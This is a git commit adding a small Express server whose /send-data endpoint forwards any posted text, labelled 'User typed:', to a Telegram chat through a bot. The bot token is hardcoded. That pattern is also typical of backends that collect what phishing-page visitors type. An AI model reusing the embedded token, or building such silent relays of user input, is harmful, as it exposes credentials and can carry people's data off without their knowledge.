aa42167eb51ab330bb196492461aa01d495a449d
James230kk <mohmeedlaptop@outlook.com>
2025-12-06 15:57:53 +0300

    Initial commit

---
+++ server.js
@@ -0,0 +1,22 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const axios = require('axios');
+
+const app = express();
+app.use(bodyParser.json());
+
+const TELEGRAM_TOKEN = '8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k';
+const CHAT_ID = '8556980478';
+
+app.post('/send-data', async (req, res) => {
+  const userText = req.body.text;
+
+  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    chat_id: CHAT_ID,
+    text: `User typed: ${userText}`
+  });
+
+  res.send({ success: true });
+});
+
+app.listen(3000, () => console.log('Server running on port 3000'));
